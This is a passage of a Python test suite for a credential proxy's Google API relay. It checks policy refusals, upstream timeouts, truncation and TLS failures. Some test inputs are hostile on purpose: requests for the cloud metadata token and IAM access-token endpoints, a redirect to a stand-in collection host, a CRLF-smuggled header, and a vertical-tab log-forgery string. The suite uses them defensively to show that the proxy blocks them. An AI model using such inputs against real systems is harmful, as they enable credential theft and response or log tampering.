        self.assertEqual("API_RELAY_BAD_QUERY", payload["code"])

    # -- the policy, over the wire ---------------------------------------

    def test_a_policy_refusal_is_403_in_the_exec_shape_with_its_audit_line(self):
        cases = (
            ("GET", "/v1/gcp/monitoring.googleapis.com/v3/projects/kagents-dev/alertPolicies", "gcp.api.path"),
            ("GET", "/v1/gcp/monitoring.googleapis.com/v3/projects/kagents-dev/timeSeries/x", "gcp.api.path"),
            ("GET", "/v1/gcp/iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/x:generateAccessToken",
             "gcp.api.host-refused"),
            ("GET", "/v1/gcp/metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
             "gcp.api.host-refused"),
            ("GET", "/v1/gcp/logging.googleapis.com/v2/entries", "gcp.api.host"),
            ("GET", "/v1/gcp/evil.example.com/anything", "gcp.api.host"),
            ("POST", self.ALLOWED, "gcp.api.method"),
            ("POST", "/v1/gcp/monitoring.googleapis.com/v3/projects/kagents-dev/timeSeries:query", "gcp.api.method"),
        )
        for method, path, rule in cases:
            with self.subTest(method=method, path=path):
                with self.assertLogs(credential_proxy.LOGGER, level="INFO") as logs:
                    status, _, payload = self._json_request(path, method=method)
                self.assertEqual(403, status)
                self.assertEqual(
                    {"status": "blocked", "code": "SECURITY_POLICY_BLOCKED", "rule": rule},
                    {key: payload[key] for key in ("status", "code", "rule")},
                )
                self.assertTrue(payload["message"])
                self.assertEqual([], self.upstream_requests)
                self.assertEqual([], self.relay.hosts, "a refused request never opens a connection")
                lines = [r.getMessage() for r in logs.records]
                self.assertTrue(any(line.startswith("api request_id=") for line in lines))
                blocked = [line for line in lines if line.startswith("api blocked request_id=")]
                self.assertEqual(1, len(blocked))
                self.assertTrue(blocked[0].endswith(f" rule={rule}"), blocked[0])

    def test_a_refused_post_with_a_large_body_still_receives_its_403(self):
        # A body larger than the socket buffers is still being written when
        # the handler answers; closing on it sends a reset that swallows the
        # response unless the body is drained first.
        body = b"x" * _BODY_LARGER_THAN_SOCKET_BUFFERS
        with self.assertLogs(credential_proxy.LOGGER, level="WARNING"):
            status, _, payload = self._json_request(
                self.ALLOWED, method="POST", body=body,
                headers={"Content-Type": "application/json"},
            )
        self.assertEqual(403, status)
        self.assertEqual("gcp.api.method", payload["rule"])
        self.assertEqual([], self.upstream_requests)

    # -- the upstream misbehaving ----------------------------------------

    def test_a_body_one_byte_over_the_cap_is_502(self):
        cap = 4096
        with mock.patch.object(credential_proxy, "API_RELAY_MAX_RESPONSE_BYTES", cap):
            self.reply.update(body=b"x" * (cap + 1))
            with self.assertLogs(credential_proxy.LOGGER, level="WARNING") as logs:
                status, _, payload = self._json_request(self.ALLOWED)
            self.assertEqual(502, status)
            self.assertEqual("UPSTREAM_RESPONSE_TOO_LARGE", payload["code"])
            self.assertIn("pageSize", payload["error"])
            self.assertTrue(any("api response too large request_id=" in r.getMessage() for r in logs.records))

            self.reply.update(body=b"x" * cap)
            status, _, body = self._request(self.ALLOWED)
            self.assertEqual(200, status)
            self.assertEqual(cap, len(body), "a body exactly at the cap passes")

    def test_a_redirect_is_not_followed(self):
        self.reply.update(status=302, content_type="text/html", body=b"",
                          headers={"Location": "https://evil.example/collect"})
        with self.assertLogs(credential_proxy.LOGGER, level="WARNING") as logs:
            status, headers, payload = self._json_request(self.ALLOWED)
        self.assertEqual(502, status)
        self.assertEqual("UPSTREAM_REDIRECTED", payload["code"])
        self.assertNotIn("Location", headers)
        self.assertEqual(1, len(self.upstream_requests), "one request, no follow")
        self.assertEqual(["monitoring.googleapis.com"], self.relay.hosts)
        self.assertTrue(any("api redirect refused request_id=" in r.getMessage() and "status=302" in r.getMessage()
                            for r in logs.records))

    def test_an_upstream_that_outlives_the_deadline_is_504(self):
        self.reply.update(delay=2.0)
        with mock.patch.object(credential_proxy, "API_RELAY_DEADLINE_S", 0.3):
            started = time.monotonic()
            with self.assertLogs(credential_proxy.LOGGER, level="WARNING") as logs:
                status, _, payload = self._json_request(self.ALLOWED)
        self.assertEqual(504, status)
        self.assertEqual("UPSTREAM_TIMEOUT", payload["code"])
        self.assertLess(time.monotonic() - started, 1.5, "the deadline, not the upstream, ended the wait")
        self.assertTrue(any("api upstream timeout request_id=" in r.getMessage() for r in logs.records))

    def test_a_connect_that_hangs_is_502_naming_the_connect_timeout(self):
        # A dropped SYN raises TimeoutError from connect() after the connect
        # timeout. That is "unreachable", not the read deadline, and the log
        # names the timeout that fired.
        class HangingConnection(http.client.HTTPConnection):
            def connect(self):
                raise TimeoutError("timed out")

        self.relay.connection = lambda host: HangingConnection("127.0.0.1", self.relay.port, timeout=1)
        with self.assertLogs(credential_proxy.LOGGER, level="WARNING") as logs:
            status, _, payload = self._json_request(self.ALLOWED)
        self.assertEqual(502, status)
        self.assertEqual("UPSTREAM_UNAVAILABLE", payload["code"])
        connect_lines = [r.getMessage() for r in logs.records
                         if r.getMessage().startswith("api upstream connect timeout request_id=")]
        self.assertEqual(1, len(connect_lines))
        self.assertIn(f"connect_timeout_s={credential_proxy.API_RELAY_CONNECT_TIMEOUT_S}", connect_lines[0])
        self.assertFalse(any("deadline_s=" in r.getMessage() for r in logs.records))

    def test_a_trickling_upstream_is_cut_at_the_deadline_not_at_the_end_of_the_body(self):
        # Ten pieces, 0.2 s apart: two seconds of body. With read(n) each
        # recv re-armed the socket timeout, so the whole body arrived and the
        # deadline never fired; with read1 the deadline is checked per recv.
        pieces = [b"x" * 1024] * 10
        self.reply.update(body=b"".join(pieces), trickle=(pieces, 0.2))
        with mock.patch.object(credential_proxy, "API_RELAY_DEADLINE_S", 0.5):
            started = time.monotonic()
            with self.assertLogs(credential_proxy.LOGGER, level="WARNING"):
                status, _, payload = self._json_request(self.ALLOWED)
            elapsed = time.monotonic() - started
        self.assertEqual(504, status)
        self.assertEqual("UPSTREAM_TIMEOUT", payload["code"])
        self.assertLess(elapsed, 1.2, f"answered after {elapsed:.2f}s; the deadline was 0.5s")

    def test_a_tls_verification_failure_is_502_not_a_400(self):
        # ssl.SSLCertVerificationError is a ValueError as well as an SSLError,
        # so a belt clause written for ValueError answered a broken CA bundle
        # or a TLS-intercepting egress as a bad query. It is the upstream's
        # fault and is answered as one.
        class UnverifiableConnection(http.client.HTTPConnection):
            def connect(self):
                raise ssl.SSLCertVerificationError(1, "certificate verify failed")

        self.relay.connection = lambda host: UnverifiableConnection("127.0.0.1", self.relay.port, timeout=1)
        with self.assertLogs(credential_proxy.LOGGER, level="WARNING") as logs:
            status, _, payload = self._json_request(self.ALLOWED)
        self.assertEqual(502, status)
        self.assertEqual("UPSTREAM_UNAVAILABLE", payload["code"])
        verdicts = [r.getMessage() for r in logs.records if r.getMessage().startswith("api upstream unreachable")]
        self.assertEqual(1, len(verdicts))
        self.assertIn("type=SSLCertVerificationError", verdicts[0])
        self.assertFalse(any("API_RELAY_BAD_QUERY" in r.getMessage() for r in logs.records))

    def test_a_target_putrequest_will_not_send_is_still_a_400_at_the_connection(self):
        # The belt path, pinned at the level it protects: putrequest refusing
        # the target, after a successful connect.
        class RefusingConnection(http.client.HTTPConnection):
            def putrequest(self, method, url, **kwargs):
                raise UnicodeEncodeError("ascii", "\xe9", 0, 1, "ordinal not in range(128)")

        self.relay.connection = lambda host: RefusingConnection("127.0.0.1", self.relay.port, timeout=1)
        with self.assertLogs(credential_proxy.LOGGER, level="WARNING") as logs:
            status, _, payload = self._json_request(self.ALLOWED)
        self.assertEqual(400, status)
        self.assertEqual("API_RELAY_BAD_QUERY", payload["code"])
        self.assertTrue(any("reason=UnicodeEncodeError" in r.getMessage() for r in logs.records))

    def test_an_upstream_that_closes_short_of_its_content_length_is_502(self):
        # read1 returns b"" on an early EOF without raising for a
        # Content-Length-framed body; without the owed-bytes check a page cut
        # short relayed as a well-framed 200.
        body = b'{"timeSeries":[' + b"x" * 4096 + b"]}"
        self.reply.update(body=body, truncate_to=1000)
        with self.assertLogs(credential_proxy.LOGGER, level="INFO") as logs:
            status, _, payload = self._json_request(self.ALLOWED)
        self.assertEqual(502, status)
        self.assertEqual("UPSTREAM_TRUNCATED", payload["code"])
        self.assertNotIn("timeSeries", json.dumps(payload), "none of the partial body is relayed")
        lines = [r.getMessage() for r in logs.records if r.getMessage().startswith("api ")]
        self.assertEqual(2, len(lines), lines)
        self.assertTrue(lines[1].startswith("api upstream truncated request_id="), lines[1])
        self.assertIn(f" received=1000 expected={len(body)}", lines[1])
        self.assertFalse(any(line.startswith("api forwarded") for line in lines))

    def test_an_unreachable_upstream_is_502(self):
        # Point the relay at a port nothing listens on.
        spare = ThreadingHTTPServer(("127.0.0.1", 0), BaseHTTPRequestHandler)
        self.relay.port = spare.server_address[1]
        spare.server_close()
        with self.assertLogs(credential_proxy.LOGGER, level="WARNING") as logs:
            status, _, payload = self._json_request(self.ALLOWED)
        self.assertEqual(502, status)
        self.assertEqual("UPSTREAM_UNAVAILABLE", payload["code"])
        self.assertTrue(any("api upstream unreachable request_id=" in r.getMessage() for r in logs.records))

    # -- the broker's own side -------------------------------------------

    def test_no_relay_armed_is_503_after_the_policy_has_answered(self):
        CredentialProxyHandler.api_relay = None
        with self.assertLogs(credential_proxy.LOGGER, level="INFO") as logs:
            status, _, payload = self._json_request(self.ALLOWED)
        self.assertEqual(503, status)
        self.assertEqual("API_RELAY_DISABLED", payload["code"])
        lines = [r.getMessage() for r in logs.records if r.getMessage().startswith("api ")]
        self.assertEqual(2, len(lines), lines)
        self.assertTrue(lines[0].startswith("api request_id="))
        self.assertTrue(lines[1].startswith("api disabled request_id="), lines[1])
        self.assertTrue(lines[1].endswith(" rule=gcp.api.monitoring.timeseries-list"))
        # The policy still answers first: a refusal reads as a refusal, not an outage.
        with self.assertLogs(credential_proxy.LOGGER, level="WARNING"):
            status, _, payload = self._json_request("/v1/gcp/logging.googleapis.com/v2/entries")
        self.assertEqual(403, status)
        self.assertEqual("gcp.api.host", payload["rule"])

    def test_a_relayed_content_type_cannot_split_the_response(self):
        # The one upstream header the relay re-emits is upstream text, so it
        # gets the same CR/LF strip the agent API proxy gives every header.
        def injecting_fetch(host, target, authorization):
            return credential_proxy.ApiRelayResponse(
                200, "application/json\r\nX-Injected: 1\r\nSet-Cookie: a=b", b"{}"
            )

        self.relay.fetch = injecting_fetch
        with self.assertLogs(credential_proxy.LOGGER, level="INFO"):
            status, headers, body = self._request(self.ALLOWED)
        self.assertEqual(200, status)
        self.assertEqual(b"{}", body)
        self.assertNotIn("X-Injected", headers)
        self.assertNotIn("Set-Cookie", headers)
        self.assertEqual("application/jsonX-Injected: 1Set-Cookie: a=b", headers["Content-Type"])

    def test_the_tls_context_is_built_once_per_relay(self):
        relay = credential_proxy.GoogleApiRelay()
        first = relay.connection("monitoring.googleapis.com")
        second = relay.connection("monitoring.googleapis.com")
        self.assertIs(first._context, second._context)

    def test_a_credential_the_broker_cannot_obtain_is_503_and_names_only_the_type(self):
        def failing():
            raise RuntimeError("could not read /var/run/secrets/tokens/gcp-ksa/token")

        self.relay.authorization_header = failing
        with self.assertLogs(credential_proxy.LOGGER, level="WARNING") as logs:
            status, _, payload = self._json_request(self.ALLOWED)
        self.assertEqual(503, status)
        self.assertEqual("RELAY_CREDENTIAL_UNAVAILABLE", payload["code"])
        self.assertEqual([], self.upstream_requests)
        joined = "\n".join(r.getMessage() for r in logs.records)
        self.assertIn("api credential unavailable request_id=", joined)
        self.assertIn("type=RuntimeError", joined)
        self.assertNotIn("/var/run/secrets", joined)


class ApiRelayAuditLineCannotBeForgedTest(unittest.TestCase):
    """Caller text in the api lines goes through the same sanitizer as argv[0].

    Driven on a handler object rather than over the socket: `urlsplit` strips
    `\\n` and `\\r` from a request target, but not the vertical tab or the
    Unicode line separator, and `str.splitlines` treats both as record
    boundaries. Whatever the transport lets through, the record stays one line.
    """

    FORGERY = (
        "\x0b2026-01-01 00:00:00,000 INFO credential-proxy api request_id=y "
        "principal=system:serviceaccount:kubeagents-system:other host=x path=y "
    )

    def _handler(self, path, command="GET"):
        handler = CredentialProxyHandler.__new__(CredentialProxyHandler)
        handler.command = command
        handler.path = path
        handler.principal = credential_proxy.Principal(
            workload="system:serviceaccount:kubeagents-system:agent-shell",
            uid="u",
            role=credential_proxy.CALLER_ROLE_SHELL,
        )
        handler.replies = []
        handler._json = lambda status, payload: handler.replies.append((status, payload))
        return handler

    def _assert_one_line_each(self, logs):
        for record in logs.records:
            message = record.getMessage()
            self.assertEqual([message], message.splitlines(), message)

    def test_a_forged_host_stays_on_one_line(self):
        handler = self._handler(f"/v1/gcp/monitoring.googleapis.com{self.FORGERY}/v3/projects/p/timeSeries")
        with self.assertLogs(credential_proxy.LOGGER, level="INFO") as logs:
            handler._handle_api_relay()
        self.assertEqual(HTTPStatus.BAD_REQUEST, handler.replies[0][0])
        self._assert_one_line_each(logs)

    def test_a_forged_path_stays_on_one_line(self):
        handler = self._handler(f"/v1/gcp/monitoring.googleapis.com/v3/projects/p/timeSeries{self.FORGERY}")
        with self.assertLogs(credential_proxy.LOGGER, level="INFO") as logs:
            handler._handle_api_relay()
        # The segment carrying the forgery is not in normal form; either way,
        # the line that already logged it is intact.
        self.assertIn(handler.replies[0][0], (HTTPStatus.BAD_REQUEST, HTTPStatus.FORBIDDEN))
        self._assert_one_line_each(logs)

    def test_the_path_is_logged_wider_than_the_default_but_still_capped(self):
        long_path = "v3/projects/kagents-dev/" + "a" * 600
        handler = self._handler(f"/v1/gcp/monitoring.googleapis.com/{long_path}")
        with self.assertLogs(credential_proxy.LOGGER, level="INFO") as logs:
            handler._handle_api_relay()
        opened = next(r.getMessage() for r in logs.records if r.getMessage().startswith("api request_id="))
        logged = opened.split(" path=", 1)[1]
        self.assertEqual(credential_proxy.API_RELAY_PATH_LOG_LENGTH, len(logged))


class GoogleApiRelayCredentialTest(unittest.TestCase):
    """The relay's token is google-auth's, obtained once and refreshed by it."""

    def _google(self, credentials, defaults):
        google = types.ModuleType("google")
        auth = types.ModuleType("google.auth")
        transport = types.ModuleType("google.auth.transport")
        requests_transport = types.ModuleType("google.auth.transport.requests")

        def default(scopes=None):
            defaults.append(scopes)
            return credentials, "kagents-dev"

        auth.default = default
        requests_transport.Request = lambda: "request"
        google.auth = auth
        auth.transport = transport
        transport.requests = requests_transport
        return {
            "google": google,
            "google.auth": auth,
            "google.auth.transport": transport,
            "google.auth.transport.requests": requests_transport,
        }

    def test_default_once_refresh_only_when_lapsed(self):
        class FakeCredentials:
            def __init__(self):
                self.valid = False
                self.token = None
                self.refreshed_with = []

            def refresh(self, request):
                self.refreshed_with.append(request)
                self.token = f"tok{len(self.refreshed_with)}"
                self.valid = True

        credentials = FakeCredentials()
        defaults = []
        with mock.patch.dict(sys.modules, self._google(credentials, defaults)):
            relay = credential_proxy.GoogleApiRelay()
            self.assertEqual("Bearer tok1", relay.authorization_header())
            self.assertEqual("Bearer tok1", relay.authorization_header(), "a valid token is reused")
            credentials.valid = False
            self.assertEqual("Bearer tok2", relay.authorization_header(), "a lapsed one is refreshed")
        self.assertEqual(1, len(defaults), "google.auth.default is called once")
        self.assertEqual([credential_proxy.scoped_sa_pool.CLOUD_PLATFORM_SCOPE], defaults[0])
        self.assertEqual(["request", "request"], credentials.refreshed_with)

    def test_construction_imports_nothing(self):
        # A broker without the cloud libraries still starts; the route answers
        # 503 on first use instead.
        with mock.patch.dict(sys.modules, {"google": None, "google.auth": None}):
            relay = credential_proxy.GoogleApiRelay()
            with self.assertRaises(ImportError):
                relay.authorization_header()

    def test_the_upstream_connection_is_tls_on_443_with_a_bounded_connect(self):
        connection = credential_proxy.GoogleApiRelay().connection("monitoring.googleapis.com")
        self.assertIsInstance(connection, http.client.HTTPSConnection)
        self.assertEqual("monitoring.googleapis.com", connection.host)
        self.assertEqual(credential_proxy.API_RELAY_UPSTREAM_PORT, connection.port)
        self.assertEqual(credential_proxy.API_RELAY_CONNECT_TIMEOUT_S, connection.timeout)


class ApiRelayQueryStrippingTest(unittest.TestCase):
    """The credential keys go; every other pair is forwarded as written."""

    def test_the_four_keys_are_removed_wherever_they_sit(self):
        strip = credential_proxy.strip_credential_query_keys
        self.assertEqual("", strip("key=a"))
        self.assertEqual("filter=x", strip("key=a&filter=x"))
        self.assertEqual("filter=x", strip("filter=x&access_token=b"))
        self.assertEqual("filter=x&pageSize=5", strip("filter=x&oauth_token=c&pageSize=5"))
        self.assertEqual("filter=x", strip("bearer_token=d&filter=x"))
        self.assertEqual("filter=x", strip("key&filter=x&access_token"))
        self.assertEqual("filter=x", strip("k%65y=a&filter=x"), "the key is compared decoded")

    def test_everything_else_is_byte_for_byte(self):
        query = "filter=metric.type%3D%22a%2Fb%22+AND+x&interval.endTime=2026-09-15T00%3A00%3A00Z&&pageSize=1000"
        self.assertEqual(query.replace("&&", "&"), credential_proxy.strip_credential_query_keys(query))

    def test_a_key_that_merely_contains_a_stripped_one_stays(self):
        self.assertEqual(
            "keyed=1&my_access_token=2&oauth_token_x=3",
            credential_proxy.strip_credential_query_keys("keyed=1&my_access_token=2&oauth_token_x=3"),
        )


if __name__ == "__main__":
    unittest.main()
